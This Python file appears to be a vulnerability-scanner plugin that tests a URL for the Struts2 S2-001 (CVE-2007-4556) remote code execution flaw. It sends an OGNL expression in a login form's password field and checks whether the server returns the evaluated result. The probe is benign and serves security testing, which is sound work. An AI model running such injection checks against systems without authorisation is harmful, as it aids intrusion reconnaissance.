#!/usr/bin/env python3

import re
from app.lib.common import get_useragent
from app.lib.request import request

class S2_001_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-001漏洞,又名CVE-2007-4556漏洞',
            'description': 'Struts2 S2-001漏洞可执行任意命令, 影响范围为: WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8',
            'date': '2007-07-16',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': "application/x-www-form-urlencoded",
        }
        self.check_data = {
            'username': 12,
            'password': '%{78912+1235}'
        }

    def filter_str(self, check_str):

        """
        过滤无用字符

        :param str check_str:待过滤的字符串

        :return str temp:过滤后的字符串
        """

        pattern = re.compile('<.*?name="password" value="(.*?)" ')
        temp = pattern.findall(check_str)
        return temp

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.post(self.url, headers = self.headers, data = self.check_data)
            result = await check_req.text()
            if result:
                check_result = self.filter_str(result)
                if check_result:
                    if check_result[0] == '80147':
                        return True
        except Exception as e:
            # print(e)
            pass
    
if  __name__ == "__main__":
    S2_001 = S2_001_BaseVerify('http://localhost:8080/s2_001_war_exploded/login.action')
    print(S2_001.check())


